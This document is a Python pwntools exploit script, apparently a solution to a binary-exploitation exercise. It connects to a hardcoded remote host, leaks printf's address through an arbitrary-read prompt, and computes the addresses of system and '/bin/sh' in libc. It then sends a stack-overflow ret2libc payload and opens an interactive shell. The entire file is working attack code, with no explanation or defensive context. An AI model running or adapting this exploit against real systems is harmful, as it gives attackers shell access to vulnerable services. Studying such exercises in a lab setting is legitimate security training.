from pwn import *

context(arch='i386', os='linux')

#open libc.so.6
libc = ELF('libc.so.6')

#get offset from libc.so.6
sys_offset = libc.symbols['system']
printf_offset = libc.symbols['printf']
binsh_offset = next(libc.search('/bin/sh'))

#sys_addr = printf_addr - offset(printf) + offset(system)
#binsh_addr = printf_addr - offset(printf) + offset(binsh)

# question 5
conn = remote('140.115.53.13',11004)

conn.recvuntil("Give me an address (in dec) :")

#printf_got_addr = 0x0804a010
conn.send("134520848\n")
conn.recvuntil("The content of the address : ")
printf_addr = conn.recvline();

#remove '\n'
printf_addr = printf_addr.strip('\n')
print "printf address : " + printf_addr

#string to int
printf_addr = (int(printf_addr,16))

sys_addr = printf_addr - printf_offset + sys_offset
binsh_addr = printf_addr - printf_offset + binsh_offset
#int to hex
sys_addr = hex(sys_addr)
binsh_addr = hex(binsh_addr)
print "system address : " + sys_addr
print "binsh address : " + binsh_addr

#hex to string
sys_addr = str(sys_addr)
binsh_addr = str(binsh_addr)

#remove "0x"
sys_addr = sys_addr.split("x")[1]
binsh_addr = binsh_addr.split("x")[1]

""" system """
one = sys_addr[0] + sys_addr[1]
two = sys_addr[2] + sys_addr[3]
three = sys_addr[4] + sys_addr[5]
four = sys_addr[6] + sys_addr[7]

# add '\x'
xone = ('\\x' + one).decode('string_escape')
xtwo = ('\\x' + two).decode('string_escape')
xthree = ('\\x' + three).decode('string_escape')
xfour = ('\\x' + four).decode('string_escape')

sys_addr = xfour + xthree + xtwo + xone
#print sys_addr.encode('hex')
""" system end """

""" binsh """
one = binsh_addr[0] + binsh_addr[1]
two = binsh_addr[2] + binsh_addr[3]
three = binsh_addr[4] + binsh_addr[5]
four = binsh_addr[6] + binsh_addr[7]

# add '\x'
xone = ('\\x' + one).decode('string_escape')
xtwo = ('\\x' + two).decode('string_escape')
xthree = ('\\x' + three).decode('string_escape')
xfour = ('\\x' + four).decode('string_escape')

binsh_addr = xfour + xthree + xtwo + xone
#print binsh_addr.encode('hex')
""" binsh end """

payload = 'a'*60 + sys_addr + 'a'*4 + binsh_addr + '\n'

conn.recvuntil("Leave some message for me :")
conn.send(payload)

conn.interactive()

